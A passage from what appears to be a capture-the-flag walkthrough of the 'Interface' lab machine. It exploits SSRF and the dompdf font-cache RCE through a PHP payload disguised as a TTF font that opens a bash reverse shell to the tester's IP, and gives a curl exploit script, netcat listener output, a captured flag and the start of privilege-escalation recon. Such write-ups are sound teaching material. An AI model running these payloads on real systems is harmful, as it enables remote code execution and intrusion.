+</span></span></code></pre></td></tr></table></div></div><p>While our anchor tag points at <code>bar.com</code>, we have a hyperlink in the resulting PDF pointing at <code>/var/www/api/bar.com</code>, which may be helpful &ndash; as it exposes the path from which PDF rendering possibly runs on the target:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-04-01-15-02-41-image.png data-srcset="./assets/2023-04-01-15-02-41-image.png, ./assets/2023-04-01-15-02-41-image.png 1.5x, ./assets/2023-04-01-15-02-41-image.png 2x" data-sizes=auto alt=./assets/2023-04-01-15-02-41-image.png title=./assets/2023-04-01-15-02-41-image.png></p><p>I tried sending different payloads with iframes, javascript to manipulate the DOM &ndash; all attempting Local File Inclusion to see if I could read <code>/etc/passwd</code> &ndash; but it appears these were being filtered out.</p><p>I ran <code>python -m http.server 8081</code> locally, and sent the following payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$curl</span> -X POST -H <span class=s2>&#34;Content-Type: application/json&#34;</span> <span class=s2>&#34;http://prd.m.rendering-api.interface.htb/api/html2pdf&#34;</span> -d <span class=s1>&#39;{&#34;html&#34;: &#34;aaa&lt;link rel=\&#34;stylesheet\&#34; property=\&#34;stylesheet\&#34; type=\&#34;text/css\&#34; href=\&#34;http://10.10.14.15:8081/\&#34; &gt;bbb&#34;}&#39;</span> &gt; out.pdf
+</span></span></code></pre></td></tr></table></div></div><p>It appears this <em>did</em> result in the server reaching out to the HTTP server on my machine:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python -m http.server <span class=m>8081</span>
+</span></span><span class=line><span class=cl>Serving HTTP on 0.0.0.0 port <span class=m>8081</span> <span class=o>(</span>http://0.0.0.0:8081/<span class=o>)</span> ...
+</span></span><span class=line><span class=cl>10.10.11.200 - - <span class=o>[</span>01/Apr/2023 17:18:35<span class=o>]</span> <span class=s2>&#34;GET / HTTP/1.0&#34;</span> <span class=m>200</span> -
+</span></span></code></pre></td></tr></table></div></div><p>Looking at the output produced by this API endpoint using <code>pdfinfo</code>, the metadata shows the PDF was produced by dompdf 1.2.0:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$pdfinfo</span> out.pdf 
+</span></span><span class=line><span class=cl>Producer:       dompdf 1.2.0 + CPDF
+</span></span><span class=line><span class=cl>CreationDate:   Sat Apr  <span class=m>1</span> 17:19:09 <span class=m>2023</span> AEDT
+</span></span><span class=line><span class=cl>ModDate:        Sat Apr  <span class=m>1</span> 17:19:09 <span class=m>2023</span> AEDT
+</span></span><span class=line><span class=cl>Tagged:         no
+</span></span><span class=line><span class=cl>UserProperties: no
+</span></span><span class=line><span class=cl>Suspects:       no
+</span></span><span class=line><span class=cl>Form:           none
+</span></span><span class=line><span class=cl>JavaScript:     no
+</span></span><span class=line><span class=cl>Pages:          <span class=m>1</span>
+</span></span><span class=line><span class=cl>Encrypted:      no
+</span></span><span class=line><span class=cl>Page size:      419.53 x 595.28 pts
+</span></span><span class=line><span class=cl>Page rot:       <span class=m>0</span>
+</span></span><span class=line><span class=cl>File size:      <span class=m>1143</span> bytes
+</span></span><span class=line><span class=cl>Optimized:      no
+</span></span><span class=line><span class=cl>PDF version:    1.7
+</span></span></code></pre></td></tr></table></div></div><p>Searching for dompdf 1.20.0 exploits, we find the following: <a href=https://github.com/positive-security/dompdf-rce target=_blank rel="noopener noreffer">GitHub - positive-security/dompdf-rce: RCE exploit for dompdf</a> - CVE-2022-28368:</p><p>We know the PDF renderer will follow <code>href</code>s in the link tag, which could be a stylesheet &ndash; and this exploit appears to give RCE by injecting CSS into the PDF rendering engine which requests a malicious font file we serve up to the target:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-css data-lang=css><span class=line><span class=cl><span class=p>@</span><span class=k>font-face</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nt>font-family</span><span class=o>:</span><span class=s1>&#39;exploitfont&#39;</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>    <span class=nt>src</span><span class=p>:</span><span class=nd>url</span><span class=o>(</span><span class=s1>&#39;http://localhost:9001/exploit_font.php&#39;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=nt>font-weight</span><span class=o>:</span><span class=s1>&#39;normal&#39;</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>    <span class=nt>font-style</span><span class=o>:</span><span class=s1>&#39;normal&#39;</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>From there, the server will request the &lsquo;font&rsquo;, which contains PHP Code (but the file type based on magic bytes is a valid TTF font). This &lsquo;font&rsquo; is cached server side and looks something like:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>�</span><span class=err></span> <span class=nx>dum1�</span><span class=err></span><span class=nx>cmap</span><span class=err>`</span><span class=nx>�</span><span class=p>,</span><span class=nx>glyf5sc��</span><span class=err></span><span class=nx>head</span><span class=err></span><span class=nx>�Q6�6hhea�</span><span class=err></span><span class=nx>�</span><span class=err></span><span class=p>(</span><span class=nv>$hmtx</span><span class=err></span><span class=nx>D</span>
+</span></span><span class=line><span class=cl><span class=err></span><span class=nx>L</span><span class=err></span><span class=nx>loca</span>
+</span></span><span class=line><span class=cl><span class=err></span><span class=nx>T</span><span class=err></span><span class=nx>maxp</span><span class=err></span><span class=nx>\</span> <span class=nx>nameD</span><span class=err></span><span class=nx>�</span><span class=err></span><span class=o>|</span><span class=mi>8</span><span class=nx>dum2</span><span class=err></span><span class=nx>�</span><span class=err></span><span class=err></span> <span class=err></span><span class=o>-</span><span class=nx>��</span><span class=o>-</span><span class=nx>����</span><span class=err></span>
+</span></span><span class=line><span class=cl><span class=o>:</span><span class=mi>8</span><span class=err></span><span class=mi>3</span><span class=c1>#5:08��_&lt;�@�8�&amp;۽
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>:</span><span class=mi>8</span><span class=err></span><span class=nx>L��</span><span class=err></span>
+</span></span><span class=line><span class=cl><span class=o>:</span><span class=err></span><span class=nx>D</span>
+</span></span><span class=line><span class=cl><span class=err></span><span class=mi>6</span><span class=err></span>	<span class=err></span>	<span class=err></span>	<span class=err></span>	<span class=err></span><span class=nx>s</span>
+</span></span><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> <span class=nx>phpinfo</span><span class=p>();</span> <span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>The cached &lsquo;font&rsquo; is then available at <code>http://target/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_&lt;md5 hash>.php</code>, where the md5 hash is generated from the font URL in the stylesheet above - <code>http://localhost:9001/exploit_font.php</code></p><p>The blog here has a more thorough explanation: <a href=https://positive.security/blog/dompdf-rce target=_blank rel="noopener noreffer">From XSS to RCE (dompdf 0day) | Positive Security</a></p><p>With this in mind, let&rsquo;s serve up a dodgy font file in exploit.css:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-css data-lang=css><span class=line><span class=cl><span class=p>@</span><span class=k>font-face</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nt>font-family</span><span class=o>:</span><span class=s1>&#39;exploitfont2&#39;</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>    <span class=nt>src</span><span class=p>:</span><span class=nd>url</span><span class=o>(</span><span class=s1>&#39;http://10.10.14.15:8081/exploit_font.php&#39;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=nt>font-weight</span><span class=o>:</span><span class=s1>&#39;normal&#39;</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>    <span class=nt>font-style</span><span class=o>:</span><span class=s1>&#39;normal&#39;</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>Our <code>exploit_font.php</code> contains the following, complete with valid TTF font magic bytes and PHP with a call out to <code>system()</code> spawning a reverse shell back to my machine:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>� dum1�cmap`�,glyf5sc��head�Q6�6hhea��($hmtxD
+</span></span><span class=line><span class=cl>Lloca
+</span></span><span class=line><span class=cl>Tmaxp\ nameD�|8dum2� -��-����
+</span></span><span class=line><span class=cl>:83#5:08��_&lt;�@�8�&amp;۽
+</span></span><span class=line><span class=cl>:8L��
+</span></span><span class=line><span class=cl>:D
+</span></span><span class=line><span class=cl>6				s
+</span></span><span class=line><span class=cl>&lt;?php system(&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.15/3322 0&gt;&amp;1&#39;); ?&gt;
+</span></span></code></pre></td></tr></table></div></div><p>I wrote a basic bash script <code>exploit.sh</code> &ndash; this sends a POST request initiating the html2pdf conversion with a link tag pointing at our <code>exploit.css</code> stylesheet above, which references our malicious &lsquo;font&rsquo; containing PHP code. Knowing our malicious font is cached and accessible on the server, we <code>curl</code> it &ndash; where the URL is derived from the font name, and md5 sum of the URL above in the font face.</p><p>Here&rsquo;s the resulting 2 line script:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/usr/bin/env bash
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl>curl -X POST -H <span class=s2>&#34;Content-Type: application/json&#34;</span> <span class=s2>&#34;http://prd.m.rendering-api.interface.htb/api/html2pdf&#34;</span> -d <span class=s1>&#39;{&#34;html&#34;: &#34;aaa&lt;link rel=\&#34;stylesheet\&#34; property=\&#34;stylesheet\&#34; type=\&#34;text/css\&#34; href=\&#34;http://10.10.14.15:8081/exploit.css\&#34; &gt;bbb&#34;}&#39;</span> &gt; out.pdf
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>curl --output font_out -v <span class=s2>&#34;http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/exploitfont2_normal_</span><span class=k>$(</span><span class=nb>echo</span> -n <span class=s1>&#39;http://10.10.14.15:8081/exploit_font.php&#39;</span> <span class=p>|</span> md5sum <span class=p>|</span> awk <span class=s1>&#39;{ print $1 }&#39;</span><span class=k>)</span><span class=s2>.php&#34;</span>
+</span></span></code></pre></td></tr></table></div></div><p>So, we run <code>python -m http.server 8081</code> locally to serve up <code>exploit.css</code> and <code>exploit_font.php</code>, a separate netcat listener with <code>nc -lvnp 3322</code>. Then we run <code>./exploit.sh</code>. Our HTTP server shows that the target fetches the CSS and our &lsquo;font&rsquo;:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$python</span> -m http.server <span class=m>8081</span>
+</span></span><span class=line><span class=cl>Serving HTTP on 0.0.0.0 port <span class=m>8081</span> <span class=o>(</span>http://0.0.0.0:8081/<span class=o>)</span> ...
+</span></span><span class=line><span class=cl>10.10.11.200 - - <span class=o>[</span>01/Apr/2023 18:28:13<span class=o>]</span> <span class=s2>&#34;GET /exploit.css HTTP/1.0&#34;</span> <span class=m>200</span> -
+</span></span><span class=line><span class=cl>10.10.11.200 - - <span class=o>[</span>01/Apr/2023 18:28:13<span class=o>]</span> <span class=s2>&#34;GET /exploit_font.php HTTP/1.0&#34;</span> <span class=m>200</span> -
+</span></span></code></pre></td></tr></table></div></div><p>The server then executes the PHP in our font file, and we get a reverse shell plus immediately obtain the user flag!:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$nc</span> -lvnp <span class=m>3322</span>
+</span></span><span class=line><span class=cl>Listening on 0.0.0.0 <span class=m>3322</span>
+</span></span><span class=line><span class=cl>Connection received on 10.10.11.200 <span class=m>51042</span>
+</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>1160<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
+</span></span><span class=line><span class=cl>bash: no job control in this shell
+</span></span><span class=line><span class=cl>bash-4.4$
+</span></span><span class=line><span class=cl>bash-4.4$ ls /home
+</span></span><span class=line><span class=cl>ls /home
+</span></span><span class=line><span class=cl>dev
+</span></span><span class=line><span class=cl>bash-4.4$ ls -la /home/dev
+</span></span><span class=line><span class=cl>ls -la /home/dev
+</span></span><span class=line><span class=cl>total <span class=m>32</span>
+</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>4</span> dev  dev  <span class=m>4096</span> Jan <span class=m>16</span> 09:49 .
+</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>3</span> root root <span class=m>4096</span> Jan <span class=m>16</span> 09:49 ..
+</span></span><span class=line><span class=cl>lrwxrwxrwx <span class=m>1</span> root root    <span class=m>9</span> Jan <span class=m>10</span> 12:56 .bash_history -&gt; /dev/null
+</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> dev  dev   <span class=m>220</span> Jan <span class=m>10</span> 12:55 .bash_logout
+</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> dev  dev  <span class=m>3771</span> Jan <span class=m>10</span> 12:55 .bashrc
+</span></span><span class=line><span class=cl>drwx------ <span class=m>2</span> dev  dev  <span class=m>4096</span> Jan <span class=m>16</span> 09:49 .cache
+</span></span><span class=line><span class=cl>drwx------ <span class=m>3</span> dev  dev  <span class=m>4096</span> Jan <span class=m>16</span> 09:49 .gnupg
+</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> dev  dev   <span class=m>807</span> Jan <span class=m>10</span> 12:55 .profile
+</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> root dev    <span class=m>33</span> Mar <span class=m>31</span> 10:01 user.txt
+</span></span><span class=line><span class=cl>bash-4.4$ cat /home/dev/user.txt
+</span></span><span class=line><span class=cl>cat /home/dev/user.txt
+</span></span><span class=line><span class=cl>8f78875f28ba9ffcb836c64e03ec7e87
+</span></span></code></pre></td></tr></table></div></div><p>You&rsquo;ll notice I used <code>exploitfont2</code> for the font name, and the cached filename above &ndash; my first PHP shell didn&rsquo;t work, and I had to tweak the name, as the font is cached and would not be fetched again without changing the name.</p><h2 id=privilege-escalation>Privilege Escalation</h2><p>First I checked the output of <code>ps aux --forest</code>, but no running processes stood out. Let&rsquo;s run a copy of process spy on the target, and see if anything interesting, such as a cron job, runs:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bash-4.4$ <span class=nb>cd</span> /dev/shm                       
+</span></span><span class=line><span class=cl><span class=nb>cd</span> /dev/shm
+</span></span><span class=line><span class=cl>bash-4.4$ wget http://10.10.14.15:8081/pspy64
+</span></span><span class=line><span class=cl>wget http://10.10.14.15:8081/pspy64
+</span></span><span class=line><span class=cl>--2023-04-01 07:58:37--  http://10.10.14.15:8081/pspy64
+</span></span><span class=line><span class=cl>Connecting to 10.10.14.15:8081... connected.
+</span></span><span class=line><span class=cl>HTTP request sent, awaiting response... <span class=m>200</span> OK
+</span></span><span class=line><span class=cl>Length: <span class=m>3078592</span> <span class=o>(</span>2.9M<span class=o>)</span> <span class=o>[</span>application/octet-stream<span class=o>]</span>
+</span></span><span class=line><span class=cl>Saving to: <span class=s1>&#39;pspy64&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>bash-4.4$ chmod +x pspy64
+</span></span><span class=line><span class=cl>chmod +x pspy64
+</span></span><span class=line><span class=cl>bash-4.4$ ./pspy64
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>2023/04/01 08:00:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>0</span>    <span class=nv>PID</span><span class=o>=</span><span class=m>34707</span>  <span class=p>|</span> /usr/sbin/CRON -f 
+</span></span><span class=line><span class=cl>2023/04/01 08:00:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>0</span>    <span class=nv>PID</span><span class=o>=</span><span class=m>34706</span>  <span class=p>|</span> /bin/bash /root/clean.sh 
+</span></span><span class=line><span class=cl>2023/04/01 08:00:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>0</span>    <span class=nv>PID</span><span class=o>=</span><span class=m>34705</span>  <span class=p>|</span> /bin/sh -c /root/clean.sh 
+</span></span><span class=line><span class=cl>2023/04/01 08:00:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>0</span>    <span class=nv>PID</span><span class=o>=</span><span class=m>34704</span>  <span class=p>|</span> /usr/sbin/CRON -f 
+</span></span><span class=line><span class=cl>2023/04/01 08:00:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>0</span>    <span class=nv>PID</span><span class=o>=</span><span class=m>34703</span>  <span class=p>|</span> /usr/sbin/CRON -f 
+</span></span><span class=line><span class=cl>2023/04/01 08:00:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>0</span>    <span class=nv>PID</span><span class=o>=</span><span class=m>34708</span>  <span class=p>|</span> /bin/bash /usr/local/sbin/cleancache.sh 
+</span></span><span class=line><span class=cl>2023/04/01 08:00:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>0</span>    <span class=nv>PID</span><span class=o>=</span><span class=m>34710</span>  <span class=p>|</span> /bin/bash /usr/local/sbin/cleancache.sh 
+</span></span><span class=line><span class=cl>2023/04/01 08:00:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>0</span>    <span class=nv>PID</span><span class=o>=</span><span class=m>34709</span>  <span class=p>|</span> find /var/www/api/vendor/dompdf/dompdf/lib/fonts/ -type f -cmin -5 -exec rm <span class=o>{}</span> <span class=p>;</span> 
+</span></span><span class=line><span class=cl>2023/04/01 08:00:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>0</span>    <span class=nv>PID</span><span class=o>=</span><span class=m>34713</span>  <span class=p>|</span> find /var/www/api/vendor/dompdf/dompdf/lib/fonts/ -type f -cmin -5 -exec rm <span class=o>{}</span> <span class=p>;</span> 
+</span></span><span class=line><span class=cl>2023/04/01 08:00:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>0</span>    <span class=nv>PID</span><span class=o>=</span><span class=m>34712</span>  <span class=p>|</span> cut -d   -f1 
+</span></span><span class=line><span class=cl>2023/04/01 08:00:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>0</span>    <span class=nv>PID</span><span class=o>=</span><span class=m>34711</span>  <span class=p>|</span> /usr/bin/perl -w /usr/bin/exiftool -s -s -s -Producer /tmp/lol 
+</span></span><span class=line><span class=cl>2023/04/01 08:00:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>0</span>    <span class=nv>PID</span><span class=o>=</span><span class=m>34716</span>  <span class=p>|</span> cp /root/font_cache/dompdf_font_family_cache.php.bak /root/font_cache/dompdf_font_family_cache.php 
+</span></span><span class=line><span class=cl>2023/04/01 08:00:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>0</span>    <span class=nv>PID</span><span class=o>=</span><span class=m>34717</span>  <span class=p>|</span> chown www-data /root/font_cache/dompdf_font_family_cache.php 
+</span></span><span class=line><span class=cl>2023/04/01 08:00:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>0</span>    <span class=nv>PID</span><span class=o>=</span><span class=m>34719</span>  <span class=p>|</span> mv /root/font_cache/dompdf_font_family_cache.php /var/www/api/vendor/dompdf/dompdf/lib/fonts/dompdf_font_family_cache.php 
+</span></span><span class=line><span class=cl>2023/04/01 08:00:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>0</span>    <span class=nv>PID</span><span class=o>=</span><span class=m>34721</span>  <span class=p>|</span> 
+</span></span><span class=line><span class=cl>2023/04/01 08:00:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>0</span>    <span class=nv>PID</span><span class=o>=</span><span class=m>34724</span>  <span class=p>|</span> /bin/bash /usr/local/sbin/cleancache.sh 
+</span></span><span class=line><span class=cl>2023/04/01 08:00:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>0</span>    <span class=nv>PID</span><span class=o>=</span><span class=m>34726</span>  <span class=p>|</span> cut -d   -f1 
+</span></span><span class=line><span class=cl>2023/04/01 08:00:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>0</span>    <span class=nv>PID</span><span class=o>=</span><span class=m>34725</span>  <span class=p>|</span> /usr/bin/perl -w /usr/bin/exiftool -s -s -s -Producer /tmp/lol_original 
+</span></span><span class=line><span class=cl>2023/04/01 08:02:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>0</span>    <span class=nv>PID</span><span class=o>=</span><span class=m>34731</span>  <span class=p>|</span> /bin/bash /usr/local/sbin/cleancache.sh 
+</span></span><span class=line><span class=cl>2023/04/01 08:02:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>0</span>    <span class=nv>PID</span><span class=o>=</span><span class=m>34730</span>  <span class=p>|</span> /bin/sh -c /usr/local/sbin/cleancache.sh 
+</span></span><span class=line><span class=cl>2023/04/01 08:02:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>0</span>    <span class=nv>PID</span><span class=o>=</span><span class=m>34729</span>  <span class=p>|</span> /usr/sbin/CRON -f 
+</span></span><span class=line><span class=cl>2023/04/01 08:02:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>0</span>    <span class=nv>PID</span><span class=o>=</span><span class=m>34734</span>  <span class=p>|</span> 
+</span></span><span class=line><span class=cl>2023/04/01 08:02:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>0</span>    <span class=nv>PID</span><span class=o>=</span><span class=m>34733</span>  <span class=p>|</span> /usr/bin/perl -w /usr/bin/exiftool -s -s -s -Producer /tmp/lol 
+</span></span><span class=line><span class=cl>2023/04/01 08:02:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>0</span>    <span class=nv>PID</span><span class=o>=</span><span class=m>34732</span>  <span class=p>|</span> /bin/bash /usr/local/sbin/cleancache.sh 
+</span></span><span class=line><span class=cl>2023/04/01 08:02:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>0</span>    <span class=nv>PID</span><span class=o>=</span><span class=m>34736</span>  <span class=p>|</span> /bin/bash /dev/shm/hash.sh 
+</span></span><span class=line><span class=cl>2023/04/01 08:02:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>0</span>    <span class=nv>PID</span><span class=o>=</span><span class=m>34735</span>  <span class=p>|</span> /bin/bash /usr/local/sbin/cleancache.sh 
+</span></span><span class=line><span class=cl>2023/04/01 08:02:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>0</span>    <span class=nv>PID</span><span class=o>=</span><span class=m>34740</span>  <span class=p>|</span> cut -d   -f1 
+</span></span><span class=line><span class=cl>2023/04/01 08:02:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>0</span>    <span class=nv>PID</span><span class=o>=</span><span class=m>34739</span>  <span class=p>|</span> /usr/bin/perl -w /usr/bin/exiftool -s -s -s -Producer /tmp/lol_original 
+</span></span><span class=line><span class=cl>2023/04/01 08:02:01 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>0</span>    <span class=nv>PID</span><span class=o>=</span><span class=m>34738</span>  <span class=p>|</span> /bin/bash /usr/local/sbin/cleancache.sh 
+</span></span></code></pre></td></tr></table></div></div><p>Looking at the <code>/usr/local/sbin/cleancache.sh</code> script:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bash-4.4$ cat /usr/local/sbin/cleancache.sh
+</span></span><span class=line><span class=cl>cat /usr/local/sbin/cleancache.sh 
+</span></span><span class=line><span class=cl><span class=c1>#! /bin/bash</span>
+</span></span><span class=line><span class=cl><span class=nv>cache_directory</span><span class=o>=</span><span class=s2>&#34;/tmp&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> cfile in <span class=s2>&#34;</span><span class=nv>$cache_directory</span><span class=s2>&#34;</span>/*<span class=p>;</span> <span class=k>do</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>[[</span> -f <span class=s2>&#34;</span><span class=nv>$cfile</span><span class=s2>&#34;</span> <span class=o>]]</span><span class=p>;</span> <span class=k>then</span>
+</span></span><span class=line><span class=cl>
